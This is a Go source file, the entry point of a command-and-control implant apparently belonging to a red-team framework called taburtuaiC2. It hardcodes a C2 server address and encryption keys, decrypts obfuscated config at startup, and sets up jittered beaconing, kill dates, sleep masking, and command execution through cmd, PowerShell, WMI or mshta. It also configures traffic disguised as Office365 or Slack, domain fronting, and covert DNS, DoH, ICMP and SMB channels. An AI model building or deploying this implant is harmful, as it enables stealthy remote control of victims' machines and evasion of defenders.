package main

import (
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/mjopsec/taburtuaiC2/pkg/profiles"
	"github.com/mjopsec/taburtuaiC2/pkg/strenc"
)

// Build-time variables — overridden by -ldflags during payload generation
var (
	serverURL    = "http://192.168.10.102:8080"
	encKey       = "SpookyOrcaC2AES1"
	secondaryKey = "TaburtuaiSecondary"

	// Encrypted variants — set by agent-win-encrypted Makefile target.
	// When non-empty, init() decrypts these and overwrites the plaintext vars above.
	// xorKeyHex is a 2-char hex byte (e.g. "5a"). All three must be set together.
	serverURLEnc  = ""
	encKeyEnc     = ""
	secKeyEnc     = ""
	xorKeyHex     = ""

	// Beacon timing
	defaultInterval = "30"  // seconds
	defaultJitter   = "30"  // percent (0-100)

	// OPSEC profile fields
	defaultMaxRetries        = "5"
	defaultKillDate          = ""      // YYYY-MM-DD; empty = never
	defaultWorkingHoursOnly  = "false"
	defaultWorkingHoursStart = "0"     // 24h, e.g. 8
	defaultWorkingHoursEnd   = "0"     // 24h, e.g. 18

	// Evasion flags
	defaultEnableEvasion     = "false"
	defaultSleepMasking      = "false"
	defaultUserAgentRotation = "false"

	// Execution method — how shell commands are spawned on the target
	// Values: direct | cmd | powershell | wmi | mshta
	defaultExecMethod = "cmd"

	// Malleable HTTP profile — controls URIs, headers, and User-Agent pool.
	// Values: default | office365 | cdn | jquery | slack | ocsp
	defaultProfile = "default"

	// Domain fronting — if set, the HTTP Host header is overridden with this
	// value while the TCP connection still goes to ServerURL (the CDN front).
	// Example: FRONT_DOMAIN=c2-backend.yourdomain.com
	//          C2_SERVER=https://your-cdn-worker.workers.dev
	defaultFrontDomain = ""

	// Alternative transport selection.
	// defaultTransport: http (default) | ws | dns | doh | icmp | smb
	// When non-http, the agent bypasses the HTTP beacon loop and uses the
	// selected covert channel instead.
	defaultTransport   = "http"
	defaultWSServerURL = ""          // ws(s):// override; derived from serverURL if empty
	defaultDNSDomain   = ""          // authoritative zone for dns transport, e.g. c2.example.com
	defaultDNSServer   = ""          // DNS server address host:port (default: serverURL host:5353)
	defaultDOHDomain   = ""          // required for doh transport
	defaultDOHProvider = "cloudflare" // cloudflare | google
	defaultSMBRelay    = ""          // hostname/IP of SMB relay host
	defaultSMBPipe     = "svcctl"   // named pipe on relay

	// Certificate pinning — SHA-256 fingerprint (hex) of server TLS leaf cert.
	// Empty = no pinning (default). Format: "aabbcc..." or "aa:bb:cc:..."
	defaultCertPin = ""

	// Debug mode — keeps console open on exit (Windows)
	debugMode = "false"
)

// init decrypts build-time-encrypted strings before main() runs.
// Only active when the agent-win-encrypted Makefile target is used.
func init() {
	if xorKeyHex == "" || serverURLEnc == "" {
		return
	}
	keyVal, err := strconv.ParseUint(xorKeyHex, 16, 8)
	if err != nil {
		return
	}
	key := byte(keyVal)
	if dec := strenc.Dec(serverURLEnc, key); dec != "" {
		serverURL = dec
	}
	if dec := strenc.Dec(encKeyEnc, key); dec != "" {
		encKey = dec
	}
	if dec := strenc.Dec(secKeyEnc, key); dec != "" {
		secondaryKey = dec
	}
}

func main() {
	// Pre-initialise the Windows console subsystem so the very first subprocess
	// spawn (cmd.exe / powershell.exe) does not cause a one-time visible flash.
	// This is a no-op on non-Windows platforms.
	preinitConsole()

	interval, _ := strconv.Atoi(defaultInterval)
	if interval < 1 {
		interval = 30
	}

	jitterPct, _ := strconv.Atoi(defaultJitter)
	if jitterPct < 0 || jitterPct > 100 {
		jitterPct = 30
	}

	maxRetries, _ := strconv.Atoi(defaultMaxRetries)
	if maxRetries < 1 {
		maxRetries = 5
	}

	workStart, _ := strconv.Atoi(defaultWorkingHoursStart)
	workEnd, _ := strconv.Atoi(defaultWorkingHoursEnd)

	cfg := &AgentConfig{
		ServerURL:         serverURL,
		PrimaryKey:        encKey,
		SecondaryKey:      secondaryKey,
		Interval:          interval,
		JitterPercent:     jitterPct,
		MaxRetries:        maxRetries,
		KillDate:          defaultKillDate,
		WorkingHoursOnly:  defaultWorkingHoursOnly == "true",
		WorkingHoursStart: workStart,
		WorkingHoursEnd:   workEnd,
		EnableEvasion:     defaultEnableEvasion == "true",
		SleepMasking:      defaultSleepMasking == "true",
		UserAgentRotation: defaultUserAgentRotation == "true",
		ExecMethod:        defaultExecMethod,
		Profile:           profiles.Get(defaultProfile),
		FrontDomain:       defaultFrontDomain,
		CertPin:           defaultCertPin,
		Transport:         defaultTransport,
		WSServerURL:       defaultWSServerURL,
		DNSDomain:         defaultDNSDomain,
		DNSServer:         defaultDNSServer,
		DOHDomain:         defaultDOHDomain,
		DOHProvider:       defaultDOHProvider,
		SMBRelay:          defaultSMBRelay,
		SMBPipe:           defaultSMBPipe,
	}

	agent, err := NewAgent(cfg)
	if err != nil {
		fmt.Printf("[!] Failed to create agent: %v\n", err)
		pauseIfDebug()
		os.Exit(1)
	}

	if err := agent.Start(); err != nil {
		fmt.Printf("[!] Agent failed: %v\n", err)
		pauseIfDebug()
		os.Exit(1)
	}
	pauseIfDebug()
}

// pauseIfDebug waits for Enter before exiting when debugMode == "true"
func pauseIfDebug() {
	if debugMode == "true" {
		fmt.Print("\n[DEBUG] Press Enter to exit...")
		fmt.Scanln()
	}
}

// generateUUID returns a stable v4-format UUID derived from host properties.
// Using hostname+username+os means the same machine always registers with the
// same agent ID, so the operator can queue commands without worrying about
// UUID churn on agent restarts or rebuilds.
func generateUUID() string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	seed := hostname + "|" + username + "|" + serverURL // serverURL baked in at build time
	h := sha256.Sum256([]byte(seed))
	b := h[:16]

	// Force UUID v4 version and RFC-4122 variant bits
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

// randomUUID is kept for cases where a non-deterministic ID is explicitly needed.
func randomUUID() string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		now := time.Now().UnixNano()
		for i := range b {
			b[i] = byte((now >> (i * 8)) & 0xFF)
		}
	}
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}
